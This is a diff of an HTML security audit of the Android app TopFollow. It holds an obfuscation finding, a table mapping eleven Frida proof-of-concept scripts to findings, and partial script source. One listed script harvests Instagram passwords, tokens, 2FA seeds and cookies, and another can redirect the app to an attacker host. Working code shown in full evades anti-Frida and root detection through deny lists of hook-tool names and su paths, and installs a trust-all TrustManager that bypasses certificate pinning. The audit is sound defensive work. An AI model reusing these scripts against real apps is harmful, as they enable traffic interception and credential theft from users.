 <article class="vuln card" id="OBFU-02" data-sev="Low" data-cat="Obfuscation" data-search="obfu-02 ollvm control-flow flattening only: .text entropy is 6.86, so the library is not packed obfuscation per-section entropy across arm64 libtopfollow.so shows .text = 6.8621 over 1,591,568 bytes and whole-file entropy = 6.7518. a packed or compressed .text scores above 7.8; 6.86 is the normal range for aarch64 code. the obfuscation is therefore purely control-flow: the aes wrapper at 0x34424 contains 1,085 instructions with a histogram of mov &amp;nbsp;191, movk &amp;nbsp;142, cmp &amp;nbsp;119, cset &amp;nbsp;46, b.eq &amp;nbsp;28, b.ne &amp;nbsp;23 and a single dispatch loop the signature of ollvm bogus-control-flow plus flattening. .rodata is only 37,547 bytes, so the claimed multi-megabyte white-box table cannot exist at any offset in a 1,805,400-byte file. the highest-entropy 4 kib windows in the whole binary are 0x12000-0x13000 at 7.9954 and 0x13000-0x14000 at 7.9613 and those two windows are precisely the aes s-box and inverse s-box, not a white-box table. .eh_frame yields 1,090 well-formed fdes, which a packer would destroy. the binary looks formidable 1.8 mb, a single exported symbol, 22 runtime-registered natives, flattened control flow but none of that is packing, and the absence of packing is what made the whole analysis possible statically. every secret was recoverable without executing the app: 943 position-independent thunks resolved to 760 .rodata references, and a single-byte xor sweep over keys 1-127 recovered the backend url, the instagram endpoints, the certificate pin and the anti-analysis keyword tables. assessing this app's real strength requires separating obfuscation from protection: the former is heavy, the latter is thin. work/out/30_aes_forensics_arm64.txt sections 6-7 (per-section entropy, top entropy windows); instruction histogram of 0x34424 ; .rodata = 37,547 b; 1,090 .eh_frame fdes from work/native_deep.py ; no white-box table at the claimed offsets obfuscation is not a control. spend the budget on server-side verification and hardware-backed attestation; client-side flattening only raises analysis cost, it does not change what an attacker who finishes the analysis can do.">
   <header>
     <div class="vid">OBFU-02</div>
@@ -2472,13 +2587,13 @@ for (i = 0; i &lt; len; i++)  buf[i] ^= 0x6C;                                // 
 <div class="card">
 <p>Every script is self-contained and heavily commented with the exact classes, offsets and literals it targets. Load <code>00_common.js</code> first; <code>01</code> and <code>02</code> are prerequisites for almost everything else because the app's bootstrap runs its checks inside <code>JNI_OnLoad</code>. <b>Spawn mode is required</b> &mdash; attaching after start misses the signature check and the Retrofit construction.</p>
 <div class="tablewrap"><table><thead><tr><th>#</th><th>Script</th><th>Purpose</th><th>Findings demonstrated</th></tr></thead><tbody>
-<tr data-search="00_common.jsshared helpers: java class resolver, overload tracer, registernatives capture, sharedpreferences dumper."><td><code>00</code></td><td><a href="#script-00_common"><code>00_common.js</code></a></td><td>Shared helpers: Java class resolver, overload tracer, RegisterNatives capture, SharedPreferences dumper.</td><td><span class="chips"></span></td></tr><tr data-search="01_anti_tamper_killer.jsdefeats the signature self-check, /proc/self/maps scan, anti-frida markers, root-path probes, emulator checks, play-store cert gate and the snd/rid integrity gate."><td><code>01</code></td><td><a href="#script-01_anti_tamper_killer"><code>01_anti_tamper_killer.js</code></a></td><td>Defeats the signature self-check, /proc/self/maps scan, anti-Frida markers, root-path probes, emulator checks, Play-Store cert gate and the SND/RID integrity gate.</td><td><span class="chips"><a class="chip" href="#CRYP-02">CRYP-02</a> <a class="chip" href="#INTE-01">INTE-01</a> <a class="chip" href="#INTE-02">INTE-02</a> <a class="chip" href="#INTE-03">INTE-03</a> <a class="chip" href="#INTE-04">INTE-04</a> <a class="chip" href="#INTE-05">INTE-05</a> <a class="chip" href="#INTE-08">INTE-08</a> <a class="chip" href="#INTE-12">INTE-12</a> <a class="chip" href="#STOR-16">STOR-16</a> <a class="chip" href="#INTE-14">INTE-14</a></span></td></tr><tr data-search="02_ssl_pinning_bypass.jskills the okhttp certificatepinner built from native code, installs a trust-all trustmanager, and reveals the server-rotated pin from sharedpreferences."><td><code>02</code></td><td><a href="#script-02_ssl_pinning_bypass"><code>02_ssl_pinning_bypass.js</code></a></td><td>Kills the OkHttp CertificatePinner built from native code, installs a trust-all TrustManager, and reveals the server-rotated pin from SharedPreferences.</td><td><span class="chips"><a class="chip" href="#CRYP-04">CRYP-04</a> <a class="chip" href="#CRYP-05">CRYP-05</a> <a class="chip" href="#BIZ-12">BIZ-12</a> <a class="chip" href="#TRAN-01">TRAN-01</a> <a class="chip" href="#TRAN-02">TRAN-02</a> <a class="chip" href="#TRAN-03">TRAN-03</a> <a class="chip" href="#STOR-07">STOR-07</a> <a class="chip" href="#CRYP-12">CRYP-12</a></span></td></tr><tr data-search="03_instagram_api_intercept.jsfull request/response logging of all three instagram retrofits, the ia.q.f() header factory, d.p()/d.q() crypto and every native signed_body."><td><code>03</code></td><td><a href="#script-03_instagram_api_intercept"><code>03_instagram_api_intercept.js</code></a></td><td>Full request/response logging of all three Instagram Retrofits, the ia.q.f() header factory, d.p()/d.q() crypto and every native signed_body.</td><td><span class="chips"><a class="chip" href="#CRED-04">CRED-04</a> <a class="chip" href="#CRED-06">CRED-06</a> <a class="chip" href="#CRED-07">CRED-07</a> <a class="chip" href="#CRED-08">CRED-08</a> <a class="chip" href="#TRAN-05">TRAN-05</a> <a class="chip" href="#STOR-12">STOR-12</a> <a class="chip" href="#STOR-13">STOR-13</a> <a class="chip" href="#STOR-14">STOR-14</a></span></td></tr><tr data-search="04_credential_theft.jsharvests instagram passwords, bearer tokens, 2fa seeds, the webview cookie jar and all ciphered sharedpreferences, and writes a json dump."><td><code>04</code></td><td><a href="#script-04_credential_theft"><code>04_credential_theft.js</code></a></td><td>Harvests Instagram passwords, bearer tokens, 2FA seeds, the WebView cookie jar and all ciphered SharedPreferences, and writes a JSON dump.</td><td><span class="chips"><a class="chip" href="#CRED-01">CRED-01</a> <a class="chip" href="#CRED-02">CRED-02</a> <a class="chip" href="#CRED-03">CRED-03</a> <a class="chip" href="#CRYP-01">CRYP-01</a> <a class="chip" href="#INTE-11">INTE-11</a> <a class="chip" href="#BIZ-05">BIZ-05</a> <a class="chip" href="#STOR-01">STOR-01</a> <a class="chip" href="#STOR-02">STOR-02</a> <a class="chip" href="#STOR-03">STOR-03</a> <a class="chip" href="#STOR-07">STOR-07</a></span></td></tr><tr data-search="05_coin_economy_bypass.jsinflates the local coin/gem wallet, forces every affordability check, rewrites order_count/type at submit time and logs all 26 backend endpoints."><td><code>05</code></td><td><a href="#script-05_coin_economy_bypass"><code>05_coin_economy_bypass.js</code></a></td><td>Inflates the local coin/gem wallet, forces every affordability check, rewrites order_count/type at submit time and logs all 26 backend endpoints.</td><td><span class="chips"><a class="chip" href="#BIZ-03">BIZ-03</a> <a class="chip" href="#BIZ-04">BIZ-04</a> <a class="chip" href="#BIZ-05">BIZ-05</a> <a class="chip" href="#BIZ-08">BIZ-08</a> <a class="chip" href="#BIZ-09">BIZ-09</a> <a class="chip" href="#BIZ-10">BIZ-10</a> <a class="chip" href="#BIZ-11">BIZ-11</a> <a class="chip" href="#STOR-08">STOR-08</a> <a class="chip" href="#STOR-09">STOR-09</a> <a class="chip" href="#STOR-10">STOR-10</a></span></td></tr><tr data-search="06_task_verification_bypass.jsforges instagramresponse.getstatus()=='ok', forces get_coin='true', rewrites order_value and dumps the entire order/syncorder.php claim."><td><code>06</code></td><td><a href="#script-06_task_verification_bypass"><code>06_task_verification_bypass.js</code></a></td><td>Forges InstagramResponse.getStatus()=='ok', forces get_coin='true', rewrites order_value and dumps the entire order/syncOrder.php claim.</td><td><span class="chips"><a class="chip" href="#CRYP-03">CRYP-03</a> <a class="chip" href="#BIZ-01">BIZ-01</a> <a class="chip" href="#BIZ-02">BIZ-02</a> <a class="chip" href="#BIZ-06">BIZ-06</a> <a class="chip" href="#BIZ-07">BIZ-07</a> <a class="chip" href="#BIZ-08">BIZ-08</a> <a class="chip" href="#STOR-10">STOR-10</a> <a class="chip" href="#STOR-11">STOR-11</a> <a class="chip" href="#STOR-12">STOR-12</a> <a class="chip" href="#STOR-15">STOR-15</a></span></td></tr><tr data-search="07_native_jni_dumper.jsintercepts registernatives to resolve all 22 helper.q jni functions, instruments each, and re-derives the xor 0x55/0x5a and triple-base64 string tables from memory."><td><code>07</code></td><td><a href="#script-07_native_jni_dumper"><code>07_native_jni_dumper.js</code></a></td><td>Intercepts RegisterNatives to resolve all 22 helper.q JNI functions, instruments each, and re-derives the XOR 0x55/0x5A and triple-base64 string tables from memory.</td><td><span class="chips"><a class="chip" href="#CRED-09">CRED-09</a> <a class="chip" href="#CRYP-07">CRYP-07</a> <a class="chip" href="#CRYP-08">CRYP-08</a> <a class="chip" href="#INTE-06">INTE-06</a> <a class="chip" href="#INTE-07">INTE-07</a> <a class="chip" href="#INTE-11">INTE-11</a> <a class="chip" href="#BIZ-07">BIZ-07</a> <a class="chip" href="#TRAN-04">TRAN-04</a> <a class="chip" href="#STOR-04">STOR-04</a> <a class="chip" href="#CRYP-14">CRYP-14</a> <a class="chip" href="#CRED-11">CRED-11</a> <a class="chip" href="#INTE-14">INTE-14</a> <a class="chip" href="#OBFU-02">OBFU-02</a></span></td></tr><tr data-search="08_backend_traffic_and_servercheck.jslogs every backend post with headers and body, traces servercheck pin/url rotation live, and can redirect the whole app to an attacker host."><td><code>08</code></td><td><a href="#script-08_backend_traffic_and_servercheck"><code>08_backend_traffic_and_servercheck.js</code></a></td><td>Logs every backend POST with headers and body, traces ServerCheck pin/URL rotation live, and can redirect the whole app to an attacker host.</td><td><span class="chips"><a class="chip" href="#CRED-04">CRED-04</a> <a class="chip" href="#CRED-05">CRED-05</a> <a class="chip" href="#CRED-10">CRED-10</a> <a class="chip" href="#CRYP-04">CRYP-04</a> <a class="chip" href="#CRYP-06">CRYP-06</a> <a class="chip" href="#INTE-08">INTE-08</a> <a class="chip" href="#INTE-09">INTE-09</a> <a class="chip" href="#INTE-10">INTE-10</a> <a class="chip" href="#BIZ-11">BIZ-11</a> <a class="chip" href="#BIZ-12">BIZ-12</a> <a class="chip" href="#TRAN-02">TRAN-02</a> <a class="chip" href="#TRAN-05">TRAN-05</a> <a class="chip" href="#STOR-03">STOR-03</a> <a class="chip" href="#STOR-05">STOR-05</a> <a class="chip" href="#STOR-06">STOR-06</a> <a class="chip" href="#CRYP-12">CRYP-12</a> <a class="chip" href="#INTE-13">INTE-13</a></span></td></tr><tr data-search="09_native_aes_dump.jslocates the aes s-box by content scan (not hard-coded offsets), stalker-resolves every instruction that addresses it, attaches the five aes functions, and recovers any fips-197 round-key schedule from live memory."><td><code>09</code></td><td><a href="#script-09_native_aes_dump"><code>09_native_aes_dump.js</code></a></td><td>Locates the AES S-box by content scan (not hard-coded offsets), Stalker-resolves every instruction that addresses it, attaches the five AES functions, and recovers any FIPS-197 round-key schedule from live memory.</td><td><span class="chips"><a class="chip" href="#CRYP-09">CRYP-09</a> <a class="chip" href="#CRYP-10">CRYP-10</a> <a class="chip" href="#CRYP-13">CRYP-13</a> <a class="chip" href="#CRYP-14">CRYP-14</a> <a class="chip" href="#OBFU-02">OBFU-02</a></span></td></tr><tr data-search="10_java_crypto_layer.jshooks q8.t1.f (the #pwd_instagram:4 password encryptor), dissecting the aes-256-gcm key, iv, tag, rsa-wrapped key and plaintext; hooks every javax.crypto.cipher.init to dump raw secretkeyspec bytes; instruments helper.t ecdsa attestation and proves the dead digest([b)[b jni bridge."><td><code>10</code></td><td><a href="#script-10_java_crypto_layer"><code>10_java_crypto_layer.js</code></a></td><td>Hooks q8.t1.f (the #PWD_INSTAGRAM:4 password encryptor), dissecting the AES-256-GCM key, IV, tag, RSA-wrapped key and plaintext; hooks every javax.crypto.Cipher.init to dump raw SecretKeySpec bytes; instruments helper.T ECDSA attestation and proves the dead digest([B)[B JNI bridge.</td><td><span class="chips"><a class="chip" href="#CRYP-11">CRYP-11</a> <a class="chip" href="#CRYP-12">CRYP-12</a> <a class="chip" href="#CRED-11">CRED-11</a> <a class="chip" href="#INTE-13">INTE-13</a></span></td></tr>
+<tr data-search="00_common.jsshared helpers: java class resolver, overload tracer, registernatives capture, sharedpreferences dumper."><td><code>00</code></td><td><a href="#script-00_common"><code>00_common.js</code></a></td><td>Shared helpers: Java class resolver, overload tracer, RegisterNatives capture, SharedPreferences dumper.</td><td><span class="chips"></span></td></tr><tr data-search="01_anti_tamper_killer.jsdefeats the signature self-check, /proc/self/maps scan, anti-frida markers, root-path probes, emulator checks, play-store cert gate and the snd/rid integrity gate."><td><code>01</code></td><td><a href="#script-01_anti_tamper_killer"><code>01_anti_tamper_killer.js</code></a></td><td>Defeats the signature self-check, /proc/self/maps scan, anti-Frida markers, root-path probes, emulator checks, Play-Store cert gate and the SND/RID integrity gate.</td><td><span class="chips"><a class="chip" href="#CRYP-02">CRYP-02</a> <a class="chip" href="#INTE-01">INTE-01</a> <a class="chip" href="#INTE-02">INTE-02</a> <a class="chip" href="#INTE-03">INTE-03</a> <a class="chip" href="#INTE-04">INTE-04</a> <a class="chip" href="#INTE-05">INTE-05</a> <a class="chip" href="#INTE-08">INTE-08</a> <a class="chip" href="#INTE-12">INTE-12</a> <a class="chip" href="#STOR-16">STOR-16</a> <a class="chip" href="#INTE-14">INTE-14</a> <a class="chip" href="#INTE-15">INTE-15</a></span></td></tr><tr data-search="02_ssl_pinning_bypass.jskills the okhttp certificatepinner built from native code, installs a trust-all trustmanager, and reveals the server-rotated pin from sharedpreferences."><td><code>02</code></td><td><a href="#script-02_ssl_pinning_bypass"><code>02_ssl_pinning_bypass.js</code></a></td><td>Kills the OkHttp CertificatePinner built from native code, installs a trust-all TrustManager, and reveals the server-rotated pin from SharedPreferences.</td><td><span class="chips"><a class="chip" href="#CRYP-04">CRYP-04</a> <a class="chip" href="#CRYP-05">CRYP-05</a> <a class="chip" href="#BIZ-12">BIZ-12</a> <a class="chip" href="#TRAN-01">TRAN-01</a> <a class="chip" href="#TRAN-02">TRAN-02</a> <a class="chip" href="#TRAN-03">TRAN-03</a> <a class="chip" href="#STOR-07">STOR-07</a> <a class="chip" href="#CRYP-12">CRYP-12</a></span></td></tr><tr data-search="03_instagram_api_intercept.jsfull request/response logging of all three instagram retrofits, the ia.q.f() header factory, d.p()/d.q() crypto and every native signed_body."><td><code>03</code></td><td><a href="#script-03_instagram_api_intercept"><code>03_instagram_api_intercept.js</code></a></td><td>Full request/response logging of all three Instagram Retrofits, the ia.q.f() header factory, d.p()/d.q() crypto and every native signed_body.</td><td><span class="chips"><a class="chip" href="#CRED-04">CRED-04</a> <a class="chip" href="#CRED-06">CRED-06</a> <a class="chip" href="#CRED-07">CRED-07</a> <a class="chip" href="#CRED-08">CRED-08</a> <a class="chip" href="#TRAN-05">TRAN-05</a> <a class="chip" href="#STOR-12">STOR-12</a> <a class="chip" href="#STOR-13">STOR-13</a> <a class="chip" href="#STOR-14">STOR-14</a></span></td></tr><tr data-search="04_credential_theft.jsharvests instagram passwords, bearer tokens, 2fa seeds, the webview cookie jar and all ciphered sharedpreferences, and writes a json dump."><td><code>04</code></td><td><a href="#script-04_credential_theft"><code>04_credential_theft.js</code></a></td><td>Harvests Instagram passwords, bearer tokens, 2FA seeds, the WebView cookie jar and all ciphered SharedPreferences, and writes a JSON dump.</td><td><span class="chips"><a class="chip" href="#CRED-01">CRED-01</a> <a class="chip" href="#CRED-02">CRED-02</a> <a class="chip" href="#CRED-03">CRED-03</a> <a class="chip" href="#CRYP-01">CRYP-01</a> <a class="chip" href="#INTE-11">INTE-11</a> <a class="chip" href="#BIZ-05">BIZ-05</a> <a class="chip" href="#STOR-01">STOR-01</a> <a class="chip" href="#STOR-02">STOR-02</a> <a class="chip" href="#STOR-03">STOR-03</a> <a class="chip" href="#STOR-07">STOR-07</a></span></td></tr><tr data-search="05_coin_economy_bypass.jsinflates the local coin/gem wallet, forces every affordability check, rewrites order_count/type at submit time and logs all 26 backend endpoints."><td><code>05</code></td><td><a href="#script-05_coin_economy_bypass"><code>05_coin_economy_bypass.js</code></a></td><td>Inflates the local coin/gem wallet, forces every affordability check, rewrites order_count/type at submit time and logs all 26 backend endpoints.</td><td><span class="chips"><a class="chip" href="#BIZ-03">BIZ-03</a> <a class="chip" href="#BIZ-04">BIZ-04</a> <a class="chip" href="#BIZ-05">BIZ-05</a> <a class="chip" href="#BIZ-08">BIZ-08</a> <a class="chip" href="#BIZ-09">BIZ-09</a> <a class="chip" href="#BIZ-10">BIZ-10</a> <a class="chip" href="#BIZ-11">BIZ-11</a> <a class="chip" href="#STOR-08">STOR-08</a> <a class="chip" href="#STOR-09">STOR-09</a> <a class="chip" href="#STOR-10">STOR-10</a></span></td></tr><tr data-search="06_task_verification_bypass.jsforges instagramresponse.getstatus()=='ok', forces get_coin='true', rewrites order_value and dumps the entire order/syncorder.php claim."><td><code>06</code></td><td><a href="#script-06_task_verification_bypass"><code>06_task_verification_bypass.js</code></a></td><td>Forges InstagramResponse.getStatus()=='ok', forces get_coin='true', rewrites order_value and dumps the entire order/syncOrder.php claim.</td><td><span class="chips"><a class="chip" href="#CRYP-03">CRYP-03</a> <a class="chip" href="#BIZ-01">BIZ-01</a> <a class="chip" href="#BIZ-02">BIZ-02</a> <a class="chip" href="#BIZ-06">BIZ-06</a> <a class="chip" href="#BIZ-07">BIZ-07</a> <a class="chip" href="#BIZ-08">BIZ-08</a> <a class="chip" href="#STOR-10">STOR-10</a> <a class="chip" href="#STOR-11">STOR-11</a> <a class="chip" href="#STOR-12">STOR-12</a> <a class="chip" href="#STOR-15">STOR-15</a></span></td></tr><tr data-search="07_native_jni_dumper.jsintercepts registernatives to resolve all 22 helper.q jni functions, instruments each, and re-derives the xor 0x55/0x5a and triple-base64 string tables from memory."><td><code>07</code></td><td><a href="#script-07_native_jni_dumper"><code>07_native_jni_dumper.js</code></a></td><td>Intercepts RegisterNatives to resolve all 22 helper.q JNI functions, instruments each, and re-derives the XOR 0x55/0x5A and triple-base64 string tables from memory.</td><td><span class="chips"><a class="chip" href="#CRED-09">CRED-09</a> <a class="chip" href="#CRYP-07">CRYP-07</a> <a class="chip" href="#CRYP-08">CRYP-08</a> <a class="chip" href="#INTE-06">INTE-06</a> <a class="chip" href="#INTE-07">INTE-07</a> <a class="chip" href="#INTE-11">INTE-11</a> <a class="chip" href="#BIZ-07">BIZ-07</a> <a class="chip" href="#TRAN-04">TRAN-04</a> <a class="chip" href="#STOR-04">STOR-04</a> <a class="chip" href="#CRYP-14">CRYP-14</a> <a class="chip" href="#CRED-11">CRED-11</a> <a class="chip" href="#INTE-14">INTE-14</a> <a class="chip" href="#OBFU-02">OBFU-02</a> <a class="chip" href="#CRYP-15">CRYP-15</a> <a class="chip" href="#CRYP-19">CRYP-19</a></span></td></tr><tr data-search="08_backend_traffic_and_servercheck.jslogs every backend post with headers and body, traces servercheck pin/url rotation live, and can redirect the whole app to an attacker host."><td><code>08</code></td><td><a href="#script-08_backend_traffic_and_servercheck"><code>08_backend_traffic_and_servercheck.js</code></a></td><td>Logs every backend POST with headers and body, traces ServerCheck pin/URL rotation live, and can redirect the whole app to an attacker host.</td><td><span class="chips"><a class="chip" href="#CRED-04">CRED-04</a> <a class="chip" href="#CRED-05">CRED-05</a> <a class="chip" href="#CRED-10">CRED-10</a> <a class="chip" href="#CRYP-04">CRYP-04</a> <a class="chip" href="#CRYP-06">CRYP-06</a> <a class="chip" href="#INTE-08">INTE-08</a> <a class="chip" href="#INTE-09">INTE-09</a> <a class="chip" href="#INTE-10">INTE-10</a> <a class="chip" href="#BIZ-11">BIZ-11</a> <a class="chip" href="#BIZ-12">BIZ-12</a> <a class="chip" href="#TRAN-02">TRAN-02</a> <a class="chip" href="#TRAN-05">TRAN-05</a> <a class="chip" href="#STOR-03">STOR-03</a> <a class="chip" href="#STOR-05">STOR-05</a> <a class="chip" href="#STOR-06">STOR-06</a> <a class="chip" href="#CRYP-12">CRYP-12</a> <a class="chip" href="#INTE-13">INTE-13</a> <a class="chip" href="#CRYP-16">CRYP-16</a></span></td></tr><tr data-search="09_native_aes_dump.jslocates the aes s-box by content scan (not hard-coded offsets), stalker-resolves every instruction that addresses it, attaches the five aes functions, and recovers any fips-197 round-key schedule from live memory."><td><code>09</code></td><td><a href="#script-09_native_aes_dump"><code>09_native_aes_dump.js</code></a></td><td>Locates the AES S-box by content scan (not hard-coded offsets), Stalker-resolves every instruction that addresses it, attaches the five AES functions, and recovers any FIPS-197 round-key schedule from live memory.</td><td><span class="chips"><a class="chip" href="#CRYP-09">CRYP-09</a> <a class="chip" href="#CRYP-10">CRYP-10</a> <a class="chip" href="#CRYP-13">CRYP-13</a> <a class="chip" href="#CRYP-14">CRYP-14</a> <a class="chip" href="#OBFU-02">OBFU-02</a> <a class="chip" href="#CRYP-15">CRYP-15</a> <a class="chip" href="#CRYP-16">CRYP-16</a> <a class="chip" href="#CRYP-17">CRYP-17</a> <a class="chip" href="#CRYP-18">CRYP-18</a> <a class="chip" href="#CRYP-19">CRYP-19</a></span></td></tr><tr data-search="10_java_crypto_layer.jshooks q8.t1.f (the #pwd_instagram:4 password encryptor), dissecting the aes-256-gcm key, iv, tag, rsa-wrapped key and plaintext; hooks every javax.crypto.cipher.init to dump raw secretkeyspec bytes; instruments helper.t ecdsa attestation and proves the dead digest([b)[b jni bridge."><td><code>10</code></td><td><a href="#script-10_java_crypto_layer"><code>10_java_crypto_layer.js</code></a></td><td>Hooks q8.t1.f (the #PWD_INSTAGRAM:4 password encryptor), dissecting the AES-256-GCM key, IV, tag, RSA-wrapped key and plaintext; hooks every javax.crypto.Cipher.init to dump raw SecretKeySpec bytes; instruments helper.T ECDSA attestation and proves the dead digest([B)[B JNI bridge.</td><td><span class="chips"><a class="chip" href="#CRYP-11">CRYP-11</a> <a class="chip" href="#CRYP-12">CRYP-12</a> <a class="chip" href="#CRED-11">CRED-11</a> <a class="chip" href="#INTE-13">INTE-13</a> <a class="chip" href="#CRYP-17">CRYP-17</a></span></td></tr>
 </tbody></table></div>
-<div class="callout warn"><b>Coverage.</b> All 73 findings map to at least one of the 11 PoC scripts; every script demonstrates at least one finding. The mapping above is generated from the register, so nothing is claimed that a script does not actually exercise.</div>
+<div class="callout warn"><b>Coverage.</b> All 79 findings map to at least one of the 11 PoC scripts; every script demonstrates at least one finding. The mapping above is generated from the register, so nothing is claimed that a script does not actually exercise.</div>
 </div>
 
 <section class="card" id="script-00_common">
-  <h3><span class="mono">00_common.js</span> <span class="muted">&mdash; 123 lines</span></h3>
+  <h3><span class="mono">00_common.js</span> <span class="muted">&mdash; 125 lines</span></h3>
   <p>Shared helpers: Java class resolver, overload tracer, RegisterNatives capture, SharedPreferences dumper.</p>
   <details><summary>Show source</summary><pre class="code"><code>/* ============================================================================
  * TopFollow (com.nivaroid.topfollow v8.4.5-Beta / versionCode 845)
@@ -2490,7 +2605,9 @@ for (i = 0; i &lt; len; i++)  buf[i] ^= 0x6C;                                // 
  *                      all methods of com.nivaroid.topfollow.helper.q)
  *   backend base URL : https://top.nivafollower.app/v840/   (server-rotatable
  *                      via SharedPreferences "Pin"/"PinActive" + ServerCheckModel)
- *   IG private API   : https://b.i.instagram.com/api/v1/ , https://i.instagram.com/api/v2/
+ *   IG private API   : https://i.instagram.com/api/v1/  (native XOR-0x55 @0x1762c)
+ *                      https://b.i.instagram.com/api/v1/ (native XOR-0x55 @0x17700)
+ *                      https://i.instagram.com/api/v2/   (native 4-layer b64 @0x159ec)
  *   IG graphql/web   : https://www.instagram.com/graphql/query , https://www.instagram.com/
  *   self-cert SHA-256: d845591e086033a9035fd6b66c3c3d73aa33af90794d6b986e64779eea6bec5e
  *                      (== SHA-256 of the APK signing cert, CN=Maryam Ahmadi/O=NivaRoid)
@@ -2606,7 +2723,7 @@ if (typeof module !== 'undefined') module.exports = H;
 </section>
 
 <section class="card" id="script-01_anti_tamper_killer">
-  <h3><span class="mono">01_anti_tamper_killer.js</span> <span class="muted">&mdash; 270 lines</span></h3>
+  <h3><span class="mono">01_anti_tamper_killer.js</span> <span class="muted">&mdash; 272 lines</span></h3>
   <p>Defeats the signature self-check, /proc/self/maps scan, anti-Frida markers, root-path probes, emulator checks, Play-Store cert gate and the SND/RID integrity gate.</p>
   <details><summary>Show source</summary><pre class="code"><code>/* ============================================================================
  * 01 - ANTI-TAMPER / ANTI-FRIDA / ANTI-ROOT / SIGNATURE-CHECK KILLER
@@ -2877,11 +2994,13 @@ Java.perform(function () {
 H.hr('anti-tamper killer ARMED');
 console.log('Blocked open()/access() denials will accumulate; check with:');
 console.log('   blockedOpens =', JSON.stringify(blockedOpens));
+
+globalThis.__TF_BYPASS_ARMED = true;  // full baseline loaded: downstream scripts skip self-arm
 </code></pre></details>
 </section>
 
 <section class="card" id="script-02_ssl_pinning_bypass">
-  <h3><span class="mono">02_ssl_pinning_bypass.js</span> <span class="muted">&mdash; 167 lines</span></h3>
+  <h3><span class="mono">02_ssl_pinning_bypass.js</span> <span class="muted">&mdash; 275 lines</span></h3>
   <p>Kills the OkHttp CertificatePinner built from native code, installs a trust-all TrustManager, and reveals the server-rotated pin from SharedPreferences.</p>
   <details><summary>Show source</summary><pre class="code"><code>/* ============================================================================
  * 02 - SSL / CERTIFICATE PINNING BYYPASS  (+ MITM traffic unlock)
@@ -2911,6 +3030,112 @@ console.log('   blockedOpens =', JSON.stringify(blockedOpens));
  *        then point the device at Burp/mitmproxy with a user-installed CA.
  * ==========================================================================*/
 'use strict';
+
+/* ===========================================================================
+ * SELF-ARMING DETECTION BYPASS (mandatory baseline - built into every script)
+ * ---------------------------------------------------------------------------
+ * TopFollow detects hooks at startup unless the anti-tamper killer is active:
+ *   - maps scanner reads /proc/self/maps via __open_2 + read()/__read_chk and
+ *     string-matches XOR-0x5A/base64 tokens (frida/xposed/riru/zygisk/substrate)
+ *   - 9 su-path probes via access()/open (func#169 @0x13ba30)
+ *   - OkHttp CertificatePinner (pin d845591e...6bec5e == signing-cert digest)
+ * If 01_anti_tamper_killer.js / 02_ssl_pinning_bypass.js were loaded first they
+ * set globalThis.__TF_BYPASS_ARMED and this block is a no-op; otherwise it
+ * installs the minimal bypass set so THIS script alone still works on device.
+ * =========================================================================*/
+(function selfArmBypass() {
+  if (globalThis.__TF_BYPASS_ARMED || globalThis.__TF_SELF_ARMED) return;
+  globalThis.__TF_SELF_ARMED = true;
+  var DENY = ['frida','gum-js','gadget','re.frida','xposed','lsposed','edxposed',
+              'riru','zygisk','substrate','libbridge','(deleted)','rwxp','magisk'];
+  var ROOT = ['/sbin/su','/system/bin/su','/system/xbin/su','/data/local/xbin/su',
+              '/data/local/bin/su','/system/sd/xbin/su','/system/bin/failsafe/su',
+              '/data/local/su','superuser.apk'];
+  function sus(p) {
+    if (!p) return false;
+    var l = p.toLowerCase();
+    if (l.indexOf('/proc/self/maps') !== -1) return 'maps';
+    for (var i = 0; i &lt; ROOT.length; i++) if (l.indexOf(ROOT[i]) !== -1) return 'root';
+    return false;
+  }
+  ['open','open64','fopen','__open_2','openat','access','stat','lstat'].forEach(function (fn) {
+    var p = Module.findExportByName(null, fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) { try { this.p = a[0].readCString(); } catch (e) { this.p = null; } this.d = sus(this.p); },
+        onLeave: function (r) { if (this.d === 'root') r.replace(ptr(-1)); }
+      });
+    } catch (e) {}
+  });
+  function scrub(buf, n) {
+    if (n &lt;= 0) return n;
+    var s; try { s = buf.readUtf8String(n); } catch (e) { return n; }
+    if (!s) return n;
+    var hit = false, low = s.toLowerCase();
+    for (var i = 0; i &lt; DENY.length; i++) if (low.indexOf(DENY[i]) !== -1) { hit = true; break; }
+    if (!hit) return n;
+    var clean = s.split('\n').filter(function (l) {
+      var ll = l.toLowerCase();
+      for (var j = 0; j &lt; DENY.length; j++) if (ll.indexOf(DENY[j]) !== -1) return false;
+      return true;
+    }).join('\n');
+    var cb = Memory.allocUtf8String(clean);
+    Memory.copy(buf, cb, Math.min(n, clean.length + 1));
+    return clean.length;
+  }
+  var rp = Module.findExportByName('libc.so', 'read');
+  if (rp) Interceptor.attach(rp, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  var rc = Module.findExportByName('libc.so', '__read_chk');
+  if (rc) Interceptor.attach(rc, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  ['strstr','strcmp','strncmp'].forEach(function (fn) {
+    var p = Module.findExportByName('libc.so', fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) {
+          this.hit = false;
+          try {
+            var s1 = a[0].readCString() || '', s2 = a[1].readCString() || '';
+            var l = (s1 + '|' + s2).toLowerCase();
+            for (var i = 0; i &lt; DENY.length; i++) if (l.indexOf(DENY[i]) !== -1) { this.hit = true; break; }
+          } catch (e) {}
+        },
+        onLeave: function (r) { if (this.hit) r.replace(ptr(0)); }
+      });
+    } catch (e) {}
+  });
+  Java.perform(function () {
+    try {
+      var CP = Java.use('okhttp3.CertificatePinner');
+      CP.check.overload('java.lang.String', 'java.util.List').implementation = function () {};
+      try { CP.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function () {}; } catch (e) {}
+    } catch (e) {}
+    try {
+      var SSLContext = Java.use('javax.net.ssl.SSLContext');
+      var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+      var EmptyTM = Java.registerClass({
+        name: 'com.tf.lab.EmptyTrustManager' + Date.now(),
+        implements: [TrustManager],
+        methods: {
+          checkClientTrusted: function () {},
+          checkServerTrusted: function () {},
+          getAcceptedIssuers: function () { return []; }
+        }
+      }).$new();
+      var ctx = SSLContext.getInstance('TLS');
+      ctx.init(null, [EmptyTM], null);
+    } catch (e) {}
+  });
